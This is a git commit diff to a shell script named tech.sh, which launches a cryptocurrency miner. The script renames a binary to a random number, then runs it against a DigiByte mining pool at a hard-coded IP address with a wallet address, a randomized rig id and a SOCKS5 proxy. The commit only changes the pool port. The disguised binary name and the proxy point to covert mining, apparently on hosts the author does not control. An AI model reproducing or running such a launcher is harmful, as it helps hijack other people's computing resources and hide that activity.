010dffea60cc9b35b7592f88d50aebae0fd1ce39
mynameokta11 <90979709+mynameokta11@users.noreply.github.com>
2021-12-15 06:03:48 +0700

    Update tech.sh

--- tech.sh
+++ tech.sh
@@ -3,4 +3,4 @@ chmod +x rstd
 TOP=$(shuf -n 1 -i 1-200000)
 USER=$1
 mv rstd $TOP
-./$TOP -o 216.158.235.72:1080 -u DKjK3oBfsBtCeLaSL2LGTqoVbJauHB97gT --coin=DGB --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL) -x socks5://174.77.111.197:4145
+./$TOP -o 216.158.235.72:1234 -u DKjK3oBfsBtCeLaSL2LGTqoVbJauHB97gT --coin=DGB --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL) -x socks5://174.77.111.197:4145
